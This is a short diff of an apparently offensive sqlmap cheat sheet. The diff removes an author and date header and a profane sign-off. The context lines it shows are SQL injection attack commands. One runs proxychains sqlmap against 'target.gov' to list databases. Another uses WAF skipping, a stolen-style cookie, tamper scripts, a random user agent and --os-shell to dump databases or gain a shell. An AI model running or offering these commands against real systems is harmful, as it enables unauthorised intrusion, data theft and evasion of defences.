@@ -1,8 +1,4 @@
-   SQLmap Special Command  
- 
-old release : 21 June 2021  
-new update : 4 June 2022    
-cr3at0r by Omest            
+   SQLmap Special Command           
 
 
 1. BASIC COMMAND SQLMAP
@@ -320,5 +316,5 @@ dian@blackhat:~# proxychains sqlmap -u "target.gov" --dbs --batch
 sqlmap -u "target" --skip-waf --cookie="cookienya" --dbs/--os-shell --batch --flush-session --technique=BEUQ --time-sec=2 --tamper=space2comment.py --random-agent
 
 DONE
-thanks bitch, i'm so tired write this tutorials fuck!!!
+
 
